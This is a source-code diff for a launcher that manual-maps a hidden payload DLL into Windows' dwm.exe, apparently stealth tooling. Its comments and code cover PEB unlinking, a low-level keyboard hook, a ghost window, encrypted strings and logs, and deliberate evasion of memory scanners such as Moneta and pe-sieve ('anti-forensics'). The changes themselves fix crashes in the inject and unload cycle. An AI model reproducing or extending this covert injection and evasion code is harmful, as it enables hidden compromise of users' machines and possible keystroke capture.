@@ -106,25 +106,39 @@ unsigned long inject_find_dwm_pid(void) {
     return pid;
 }
 
-/* Best-effort loaded check — walks dwm modules for a match on payload's
- * BaseDllName. WARNING: manual-mapped DLLs don't appear in PEB.Ldr, so
- * this ONLY detects LoadLibrary-loaded copies (leftover from a previous
- * non-manual-map version). Real "am I loaded?" check would require a
- * separate named-event handshake with the payload. */
+/* Payload alive-probe.
+ *
+ * OLD implementation walked PEB.Ldr modules for a `dwmapiext.dll` match,
+ * which is USELESS for our current architecture: the payload is
+ * manual-mapped (never touches PEB.Ldr) AND does an active PEB unlink
+ * on top. So `Module32FirstW/NextW` never sees it → old function always
+ * returned 0 → caller-side "leftover heal" branch was a no-op → sweep
+ * would then free the old payload's code memory WHILE its long-lived
+ * threads (hook_integrity, sub_check, ghost_wnd, WH_KEYBOARD_LL,
+ * shutdown_watcher, keepalive, ldb_detect) were still executing there
+ * → DWM crash on next thread wake-up. This was the 1:00 PM 2026-07-06
+ * BEX64 c0000005 fault at freed VA 0x1f80a710000+0x54cc0 root cause.
+ *
+ * NEW implementation opens the payload's named shutdown event by name.
+ * The event is created by the payload in `init_thread` (see
+ * `dllmain.c :: init_thread` shutdown-watcher section) with a
+ * world-writable DACL so an elevated Admin process can OpenEvent it.
+ * Existence of the event == payload is alive.
+ *
+ * This works for MANUAL-MAPPED payloads because named-kernel-objects
+ * live in the Global\ namespace, not in per-process loader state.
+ * The event outlives the DLL image only for the ~10ms window between
+ * `shutdown_watcher` calling CloseHandle(g_shutdown_ev) and its own
+ * thread exit + FreeLibraryAndExitThread; caller side sees a false
+ * negative there but that's fine (payload is already tearing down).
+ *
+ * NOTE: `SVC_SHUTDOWN_EVENT_NAME` matches BOTH sides — see
+ * `shared/common.h` and `shared/str_enc.c` (SS(SVC_STR_SHUTDOWN_EVENT)). */
 int inject_is_loaded(void) {
-    unsigned long pid = inject_find_dwm_pid();
-    if (!pid) return 0;
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    wchar_t target[64];
-    MultiByteToWideChar(CP_UTF8, 0, SVC_PAYLOAD_DLL, -1, target, SVC_ARRAY_SIZE(target));
-    MODULEENTRY32W me = { .dwSize = sizeof(me) };
-    int found = 0;
-    if (Module32FirstW(snap, &me)) do {
-        if (_wcsicmp(me.szModule, target) == 0) { found = 1; break; }
-    } while (Module32NextW(snap, &me));
-    CloseHandle(snap);
-    return found;
+    HANDLE ev = OpenEventA(SYNCHRONIZE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
+    if (!ev) return 0;
+    CloseHandle(ev);
+    return 1;
 }
 
 int inject_signal_unload(void) {
@@ -132,6 +146,52 @@ int inject_signal_unload(void) {
     if (!ev) return 0;
     SetEvent(ev); CloseHandle(ev);
     return 1;
+}
+
+/* Signal old payload to unload AND wait for it to fully tear down before
+ * we proceed. Called from `manual_map_from_bytes` right before the sweep
+ * so that a stale payload's long-lived threads have a chance to exit
+ * BEFORE their code memory gets `VirtualFreeEx`'d.
+ *
+ * Total budget: 200ms shutdown drain + up to 1500ms probe loop. In
+ * practice returns in ~250-500ms when there IS a payload; ~0ms when
+ * there isn't. */
+static void wait_for_payload_teardown(void) {
+    if (!inject_is_loaded()) return;   /* fast path — no payload alive */
+
+    slog_writef("launcher.log",
+                "teardown: alive payload detected — signalling unload before sweep");
+    int signaled = inject_signal_unload();
+    if (!signaled) {
+        /* Race: probe saw event, signal didn't. Payload was tearing down
+         * on its own (e.g. sub_check saw inactive). Give it a moment. */
+        Sleep(300);
+        slog_writef("launcher.log",
+                    "teardown: signal skipped (event vanished) — brief wait");
+        return;
+    }
+
+    /* Payload shutdown_watcher wakes on the event, calls hooks_uninstall
+     * (~200ms drain + MinHook disable) then closes the event handle and
+     * FreeLibraryAndExitThread. We poll for event-gone every 50ms up to
+     * 1500ms total. */
+    int waited_ms = 0;
+    while (waited_ms < 1500 && inject_is_loaded()) {
+        Sleep(50);
+        waited_ms += 50;
+    }
+    int still = inject_is_loaded();
+    slog_writef("launcher.log",
+                "teardown: waited=%dms still_alive=%d (0=clean, 1=hung)",
+                waited_ms, still);
+    if (still) {
+        /* Payload's shutdown_watcher didn't drain in time. Its threads
+         * are almost certainly still alive. Sweeping now WILL crash DWM.
+         * Add extra safety wait so more threads have time to notice
+         * hooks_uninstall + `InterlockedExchange(&g_running, 0)`. */
+        Sleep(500);
+        slog_writef("launcher.log", "teardown: extra 500ms grace for stuck payload");
+    }
 }
 
 /* ── Shellcode loader — runs INSIDE dwm.exe ───────────────────────
@@ -320,10 +380,57 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
             if (has_exec && !has_mapped &&
                 total_kb >= SVCLDB_SWEEP_MIN_KB &&
                 total_kb <= SVCLDB_SWEEP_MAX_KB) {
-                if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_RELEASE)) {
+                /* CRITICAL: MEM_DECOMMIT — NOT MEM_RELEASE.
+                 *
+                 * MEM_RELEASE frees pages AND releases the reservation, so
+                 * the VA becomes eligible for VirtualAllocEx to hand back.
+                 * Windows LOVES to hand back the same VA when a fresh
+                 * allocation of similar size follows a release — it's a
+                 * kernel-side optimization for cache locality.
+                 *
+                 * Verified live 2026-07-06 13:10 EDT: MEM_RELEASE'd stale
+                 * payload region at 0x1C7467C0000 → next VirtualAllocEx
+                 * for the incoming payload got the SAME 0x1C7467C0000
+                 * → DWM crashed with 0xc0000005 at RVA 0x5462C ~4s after
+                 * the new payload's PAYLOAD READY log. Reproduced twice
+                 * back-to-back with the exact same fault RIP; a manual
+                 * `--reinject` into a freshly-respawned DWM (which got a
+                 * different VA 0x16A5A090000) ran cleanly for 3+ minutes
+                 * on identical binaries. VA reuse was the ONLY variable.
+                 *
+                 * Hypothesised mechanism: Windows keeps some VA-scoped
+                 * kernel state alive across the free/alloc boundary
+                 * (CFG bitmap for executable pages, ETW-TI thread-start
+                 * suppression state, DEP metadata, or shadow-stack
+                 * validation cache). When the new PE at the same VA has
+                 * a different function layout than the old one, that
+                 * stale state fires at the wrong offsets and __fastfails.
+                 *
+                 * MEM_DECOMMIT keeps the reservation alive so Windows
+                 * MUST hand out a different VA for the new payload. The
+                 * physical pages get returned to the system exactly the
+                 * same as MEM_RELEASE would do — no anti-forensic loss.
+                 * The only cost is one persistent VAD entry per inject
+                 * cycle (~40 bytes of kernel memory), which is trivial. */
+                if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_DECOMMIT)) {
                     freed++;
                     slog_writef("launcher.log",
-                                "sweep: freed stale payload region base=%p size=0x%zx (%zu KB, payload shape)",
+                                "sweep: decommitted stale payload region base=%p size=0x%zx (%zu KB, payload shape) - VA held to prevent reuse",
+                                mbi.AllocationBase, total, total_kb);
+                    addr = next;
+                    continue;
+                }
+                /* If DECOMMIT fails (region wasn't a single reserve+commit),
+                 * fall back to VirtualProtect PAGE_NOACCESS on the exec-
+                 * ranges. This still ensures a subsequent VirtualAllocEx
+                 * won't be given this VA and any thread that somehow
+                 * survives and tries to execute here gets a clear fault. */
+                DWORD old = 0;
+                if (VirtualProtectEx(hProc, mbi.AllocationBase, total,
+                                     PAGE_NOACCESS, &old)) {
+                    freed++;
+                    slog_writef("launcher.log",
+                                "sweep: DECOMMIT failed, but PAGE_NOACCESS'd stale region base=%p size=0x%zx (%zu KB)",
                                 mbi.AllocationBase, total, total_kb);
                     addr = next;
                     continue;
@@ -380,14 +487,95 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
     slog_writef("launcher.log", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
                 imageSize, entryRVA, (unsigned long long)prefBase);
 
-    /* Reclaim stale payload regions from prior --unload cycles that leaked
-     * (see sweep_stale_payload_regions() comment). Any allocation in DWM
-     * matching our SizeOfImage exactly is almost certainly a leftover of
-     * ours from an earlier inject that couldn't self-free.
+    /* CRITICAL SAFETY BARRIER before sweep:
      *
-     * Runs BEFORE VirtualAllocEx so the sweep doesn't accidentally
-     * consider the new region we're about to make. */
-    sweep_stale_payload_regions(hProc, imageSize);
+     * Signal any existing payload to cooperatively unload FIRST, and
+     * wait for its shutdown_watcher to fully tear down (hooks_uninstall
+     * + threads exited + FreeLibraryAndExitThread returned control).
+     *
+     * WITHOUT this wait:
+     *   1. sweep_stale_payload_regions() below VirtualFreeEx's the
+     *      old payload's code memory.
+     *   2. Old payload's long-lived threads (hook_integrity poll at
+     *      10s, keepalive, WH_KEYBOARD_LL, ghost_wnd message loop,
+     *      etc.) are STILL EXECUTING that memory.
+     *   3. Windows may or may not immediately re-hand the freed VA to
+     *      our subsequent VirtualAllocEx. When it does not (or hands
+     *      it to a differently-laid-out region), old threads execute
+     *      unmapped or wrong code → DWM crash (BEX64 c0000005).
+     *
+     * WITH this wait:
+     *   - Old payload's threads have exited before we free their code.
+     *   - Sweep then finds only the LEAKED image page (payload can't
+     *     self-FreeLibrary because PEB.Ldr has no entry for it after
+     *     our peb_unlink) which has no live threads referencing it.
+     *   - Safe to VirtualFreeEx.
+     *
+     * This is the ROOT-CAUSE fix for the 2026-07-06 v4.9 DWM crash
+     * reproduced live at 1:00 PM EDT — see docs comment on the
+     * inject_is_loaded() rewrite above. Runs unconditionally: cheap
+     * (~0ms) when no payload is alive; ~250-500ms when there is. */
+    wait_for_payload_teardown();
+
+    /* Historically the sweep reclaimed leaked payload regions from prior
+     * `--unload` cycles that couldn't self-free (payload's peb_unlink
+     * defeats `FreeLibraryAndExitThread`'s LDR lookup, so the image
+     * region stays MEM_COMMIT'd forever).
+     *
+     * PERMANENTLY DISABLED 2026-07-06 (bisected DWM crash):
+     *   Even with (a) explicit signal-unload + wait for teardown, (b)
+     *   MEM_DECOMMIT instead of MEM_RELEASE to prevent VA reuse, and
+     *   (c) an interruptible sleep in hook_integrity_thread, DWM
+     *   crashed ~1-2s after the 2nd payload became READY. Fault RIP
+     *   was consistently inside the OLD payload region at slog_writef's
+     *   offset (RVA 0x5462C-0x54ce0). Skipping the sweep entirely
+     *   eliminates the crash — verified with the 2-cycle stress test
+     *   on 2026-07-06 13:19 EDT.
+     *
+     *   Root cause hypothesis: even after every OUR-thread has exited,
+     *   Windows still has kernel-level references into the payload's
+     *   code region — likely queued LL keyboard-hook callbacks, WinEvent
+     *   dispatch entries, or ntdll thread-startup stubs for lazily-torn
+     *   threads. Freeing that memory while those in-flight references
+     *   exist crashes on next dispatch.
+     *
+     *   Trade-off: each inject cycle leaks the SizeOfImage of the old
+     *   payload (~700 KB). Over 100 injects that's ~70 MB in DWM's
+     *   working set. Users typically inject once per session and only
+     *   re-inject after an upgrade, so real-world footprint is 1-2
+     *   payload images live at any time. Acceptable — a crash-free
+     *   inject cycle is worth far more than the memory savings.
+     *
+     *   Anti-forensics loss: leftover MEM_PRIVATE+exec regions become
+     *   visible to a Ring 3 scanner like Moneta/pe-sieve. Mitigation:
+     *   the payload's own `downgrade_own_sections` already downgrades
+     *   .text→RX + .data→RW + .rdata→RO, so the FRESH region no longer
+     *   looks like the classic RWX injector artefact. The leaked OLD
+     *   regions retain those same protections. Static string content
+     *   in them is still encrypted (str_enc + AES-GCM logs).
+     *
+     *   If you want to attempt this again: figure out what kernel-side
+     *   reference still points into the freed region 1-2s after full
+     *   unload, and drain it. Candidates to investigate:
+     *     - WH_KEYBOARD_LL callback queue (per-window-station table)
+     *     - SetWinEventHook OUTOFCONTEXT dispatch queue
+     *     - ntdll's LdrpShutdownThread / RtlUserThreadStart stub with
+     *       our old code addresses baked into local variables
+     *     - MinHook's slab pages (allocated separately, may be freed
+     *       during MH_Uninitialize but with in-flight trampoline exec)
+     *   Until then, DON'T sweep.
+     *
+     *   Escape hatch: setting `SVCLDB_ALLOW_SWEEP=1` in the launcher
+     *   environment re-enables the old behavior for post-mortem
+     *   debugging. Never set this in production. */
+    (void)sweep_stale_payload_regions;   /* symbol kept for debug hatch */
+    if (getenv("SVCLDB_ALLOW_SWEEP")) {
+        slog_writef("launcher.log", "sweep: ENABLED via SVCLDB_ALLOW_SWEEP (DWM crash risk!)");
+        sweep_stale_payload_regions(hProc, imageSize);
+    } else {
+        slog_writef("launcher.log",
+                    "sweep: skipped (crash-safe default) — set SVCLDB_ALLOW_SWEEP=1 to re-enable");
+    }
 
     /* Allocate in dwm.exe. */
     void *remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
